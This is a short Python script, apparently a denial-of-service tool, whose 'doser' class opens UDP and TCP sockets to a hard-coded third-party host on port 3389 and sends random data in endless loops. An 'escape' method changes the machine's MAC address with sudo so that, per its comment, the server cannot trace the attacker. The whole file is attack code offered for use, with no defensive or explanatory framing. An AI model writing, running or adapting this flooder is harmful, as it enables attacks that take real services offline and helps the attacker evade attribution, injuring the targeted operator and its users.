import os
import sys
import socket
import random
import hashlib 
import subprocess
import commands
from subprocess import Popen
from random import random
from mac_generator import generate_new_mac

class doser(object):
    def __init__(self, server = "zhanhen.720wan.com", ports = [3389]):
        self.server = server
        self.ports = ports

    def attack(self):
        
        IGNORE = open("/dev/null" , "w")
        sts = []
        length = len(self.ports)
        at_port = 10 * (random()) % length

        for i in range(length):

            try:
                st = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                st.connect((self.server, int(self.ports[i])))
                sts.append(st)
            except:
                continue

        while(True):
            
            data = hashlib.md5(100 * str(random())).digest()
            sts[int(10 * random() % length)].sendall(data) 
            #buf = sts[int(10 * random() % length)].recv(1024) 
            #print >>IGNORE, (buf,)

        IGNORE.close()
        for st in sts:
            st.close()

    def attack_tcp(self):

        IGNORE = open("/dev/null" , "w")
        sts = []
        length = len(self.ports)
        at_port = 10 * (random()) % length

        for i in range(length):
            try:
                st = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                st.connect((self.server, int(self.ports[i])))
                sts.append(st)
            except:
                continue

        while(True):
            data = hashlib.md5(100 * str(random())).digest()
            sts[int(10 * random() % length)].sendall(data)
        
    def escape(self):
        hw = commands.getoutput("ifconfig en0 | grep ether | tr -d ether\ ")     
        hw = hw[2:len(hw)].rstrip()
        new_hw = generate_new_mac(hw)
        os.system("sudo ifconfig en0 ether " + new_hw)
        #keep changing mac address
        #make sure server could not find doser
        
def run():
    obj_doser = doser()
    obj_doser.attack()
    obj_doser.attack_tcp()
    #obj_doser.escape()

if "__main__" == __name__:
    run()
